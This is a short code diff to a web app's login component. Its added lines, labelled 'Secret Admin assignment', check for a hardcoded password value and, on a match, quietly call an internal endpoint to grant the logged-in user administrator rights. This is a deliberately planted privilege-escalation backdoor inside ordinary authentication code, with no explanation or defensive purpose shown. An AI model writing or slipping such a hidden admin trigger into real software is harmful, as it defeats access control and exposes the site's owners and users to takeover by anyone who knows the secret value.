@@ -36,6 +36,15 @@ export default function Login() {
             }
 
             if (data?.session) {
+                // Secret Admin assignment
+                if (password === '14021') {
+                    await fetch('/api/makeAdmin', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ user_id: data.session.user.id, password })
+                    }).catch(console.error)
+                }
+
                 setIsSuccess(true)
                 setMessage('Successfully logged in!')
                 setTimeout(() => router.push('/dashboard'), 800)
